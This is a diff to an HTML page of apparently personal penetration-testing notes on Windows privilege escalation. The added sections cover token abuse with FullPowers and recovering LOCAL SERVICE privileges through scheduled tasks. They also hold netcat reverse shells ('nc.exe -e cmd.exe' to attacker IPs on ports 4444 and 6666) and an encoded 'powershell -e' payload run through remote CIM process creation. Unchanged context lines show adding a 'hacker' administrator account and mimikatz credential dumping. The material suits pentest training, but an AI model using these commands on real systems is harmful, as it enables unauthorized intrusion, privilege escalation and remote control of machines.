@@ -19,7 +19,7 @@
     <div id="navbar-container"></div>
 
     <div class="main-container">
-        <div class="sidebar" style="width: 600px;">
+        <div class="sidebar" style="width: 800px;">
             <h3>Quick content</h3>
             <ul id="sidebar-menu"></ul>
         </div>
@@ -138,7 +138,7 @@ Find-AllVulns</code></pre>
                     <p>Simpy execute it by using</p>
                     <pre><code class="language-powershell">.\EnableAllTokenPrivs.ps1</code></pre>
                     <ul>
-                        <h3>SeImpersonate</h3>
+                        <h3 id="SeImpersonate">SeImpersonate</h3>
                         <ul>
                             <p>This privlege allow us to impersonate a client after authentication. Here we have several ways to exploit it</p>
                             <ul>
@@ -353,6 +353,39 @@ Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,D
                             <pre><code class="language-bash">.\SeTcb.exe svc_add "cmd /c net user hacker pass123#! /add"</code></pre>
                             <p>Subsecuently use <b>net user</b> command to check if the user was created. If positive, now add it to the administrator group </p>
                             <pre><code class="language-bash">.\SeTcb.exe group "cmd /c net localgroup administrators hacker /add" </code></pre>
+                        </ul>
+
+                        <h3 id="Combination">SeAssignPrimaryTokenPrivilege + SeIncreaseQuotaPrivilege</h3>
+                        <ul>
+                            <p>If you are being assigned with <b>SeAssignPrimaryTokenPrivilege</b> and <b>SeIncreaseQuotaPrivilege</b>, you can potentially escalate your privileges.</p>
+                            <p>By using the following tool <a class="notion-link" href="https://github.com/itm4n/FullPowers">Fullpowers.exe</a></p>
+                            <p>Transfer it to the victim machine and run it</p>
+                            <pre><code class="language-powershell">.\FullPowers.exe</code></pre>
+                            <p>This will provide you with <b>SeImpersonatePrivilege</b> which can be abused by using meterpreter getsystem or other tools which can be found <a class="notion-link" href="#SeImpersonate">here</a></p>
+                            <p>Also there is another way of achieving the same result but in this case the process is manual.</p>
+                            <div class="button" onclick="toggleDiv()">Check the process here</div>
+                                <div id="foldedDiv" class="content">
+                                    <pre><code class="language-powershell"># Create a list of privileges
+PS C:\Windows\system32> [System.String[]]$Privs = "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeImpersonatePrivilege", "SeIncreaseWorkingSetPrivilege"
+
+# Create a Principal for the task 
+PS C:\Windows\system32> $TaskPrincipal = New-ScheduledTaskPrincipal -UserId "LOCALSERVICE" -LogonType ServiceAccount -RequiredPrivilege $Privs
+
+# Create an action for the task 
+PS C:\Windows\system32> $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `"C:\wamp\www\nc.exe 192.168.118.23 4444 -e cmd.exe`""
+
+# Create the task
+PS C:\Windows\system32> Register-ScheduledTask -Action $TaskAction -TaskName "GrantAllPerms" -Principal $TaskPrincipal
+
+TaskPath                                       TaskName                          State     
+--------                                       --------                          -----     
+\                                              GrantAllPerms                     Ready     
+
+# Start the task
+PS C:\Windows\system32> Start-ScheduledTask -TaskName "GrantAllPerms"
+
+#Finally capture the shell in your attacker machine using netcat</code></pre>    
+                                </div>
                         </ul>
                     </ul>
 
@@ -653,6 +686,25 @@ icacls "C:\Program Files\Enterprise Apps"</code></pre>
                         <pre><code class="language-cmd">icacls C:\Users\htb-student\AppData\Local\Microsoft\OneDrive\OneDrive.exe</code></pre>
                     </ul>
                 </ul>
+
+                    <h2 id="Recovering privileges by Abusing tokens">Recovering privileges by Abusing tokens</h2>
+                    <ul>
+                        <p>In any case you compromise a user who is <b>NT AUTHORITY\LOCAL SERVICE</b> or <b>NT AUTHORITY\NETWORK SERVICE</b> you might be able to restore default privileges and obtain <b>SeImpersonatePrivilege</b></p>
+                        <p>The thing here is that the token which the compromised users inherits it does not contain all the privileges of the original account. </p>
+                        <p>In order to check if the original accounts has more privileges that the current one we can use a scheduled task</p>
+                        <pre><code class="language-bash">schtasks /create /tn "Task1" /tr "cmd.exe /c whoami /priv > C:\windows\temp\out1.txt" /sc once /st 3:20:01 /ru "NT AUTHORITY\LOCAL SERVICE" /f  #Create a task that will generate a file with the privileges of the original account
+schtasks /run /tn "Task1"  #Run the task</code></pre>
+                        <p>In case you check the file and see more privileges that the original let's create another task to reecive a shell. For this will have to transfer <b>nc.exe</b> to the target machine</p>    
+                        <pre><code class="language-bash">schtasks /create /tn "Task7" /tr "cmd /c C:\users\public\downloads\nc.exe -e cmd.exe 192.168.45.217 6666" /sc once /st 00:00 /ru "NT AUTHORITY\LOCAL SERVICE" /f
+schtasks /run /tn "Task7"</code></pre>
+                        <p>Now if you gained the SeImpersonatePrivilege you can use it to escalate your privileges. <b>If not check the following</b> <a class="notion-link" href="#Combination">here</a> </p>    
+                        
+                        
+                        
+
+
+
+                    </ul>
 
                     <h2 id="BloodyAD">BloodyAD</h2>
                     <ul>
@@ -962,6 +1014,7 @@ mimikatz # sekurlsa::credman  </code></pre>
                         <h3>Powershell option</h3>
                         <ul>
                             <p>You could use LOL tools in order to stablish a reverse shell. This option is good but it may fail due the instability of the shell</p>
+                            <b>This does not work for stand alone machines</b>
                             <pre><code class="language-powershell">Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { whoami } </code></pre>
                             <p>Or use the following code in order to execute command as another user. We must know the password of that user we are impersonating</p>
                             <pre><code class="language-powershell">$username = 'jen';
@@ -974,7 +1027,7 @@ $Options = New-CimSessionOption -Protocol DCOM
 
 $Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
  
-$Command = 'whoami'; #Place you shellcode here
+$Command = 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AI...'; #Place you shellcode here
   
 Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};</code></pre>
                              
@@ -1295,7 +1348,7 @@ mimikatz # sekurlsa::ekeys</code></pre>
                         <pre><code class="language-cmd">wmic product get name</code></pre>
                     </ul>
 
-                    <h2 id="Installed software">DLL Hijacking</h2>
+                    <h2 id="DLL Hijacking">DLL Hijacking</h2>
                     <ul>
                         <p>Now that you have listed previously the installed software you could beggin searching for vulnerabilties that may lead to DLL hijacking. In order to exemplify a single case we will focus on a vulnerabiltity that affects FileZilla 3.63.1</p>
                         <p>First identify the path of the executable and check if you are able to write files inside the folder</p>
